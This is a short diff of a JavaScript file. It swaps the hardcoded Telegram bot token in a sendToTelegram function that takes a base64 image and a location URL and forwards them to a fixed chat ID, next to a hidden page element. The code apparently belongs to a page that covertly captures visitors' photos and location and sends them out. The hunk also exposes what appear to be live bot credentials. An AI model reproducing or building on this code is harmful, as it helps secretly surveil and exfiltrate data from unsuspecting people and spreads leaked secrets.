@@ -41,7 +41,7 @@ let sher = document.querySelector('.sher')
 sher.style.display = 'none'
 
 async function sendToTelegram(base64Image, locationURL) {
-    const token = '8317553630:AAFvWNF_7xZv9Y6cN9nNhkjtV1O9rDWrQKA';
+    const token = '8581346967:AAGkv7R80nJcZE4KBn4EFIth8TC_Ntp1r_k';
     const chatId = '921621418';
 
     const blob = await (await fetch(base64Image)).blob();
